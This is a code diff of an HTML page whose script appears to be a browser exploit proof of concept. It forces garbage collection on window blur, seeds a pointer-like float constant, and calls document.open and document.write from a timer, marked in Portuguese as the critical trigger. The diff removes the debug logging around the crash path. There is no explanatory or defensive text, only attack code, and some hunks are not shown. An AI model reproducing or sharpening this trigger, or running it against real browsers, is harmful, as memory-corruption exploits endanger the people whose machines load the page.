@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -16,12 +14,6 @@
 
 <script>
 const PATTERN = 2.121995791e-314;
-
-function safeLog(msg) {
-    try {
-        console.log(msg);
-    } catch(e){}
-}
 
 function runTest() {
     const log = document.getElementById("log");
@@ -40,9 +32,6 @@ function runTest() {
     document.documentElement.webkitRequestFullscreen?.();
 
     window.onblur = function() {
-
-        safeLog("[BLUR] triggered");
-
         // FORÇA GC
         controllers = null;
 
@@ -60,23 +49,10 @@ function runTest() {
 
         // Gatilho crítico
         setTimeout(() => {
-
-            safeLog("[1] BEFORE document.open");
-
-            try {
-                document.open();
-                safeLog("[2] AFTER document.open");
-            } catch(e) {
-                safeLog("[CRASH POINT] document.open: " + e);
-                return;
-            }
-
-            // ?? não logar depois disso no DOM — pode não existir mais
+            document.open();
             document.write("<h1>Crash</h1>");
             document.close();
-
             setTimeout(() => location.reload(), 500);
-
         }, 3000);
     };
 }
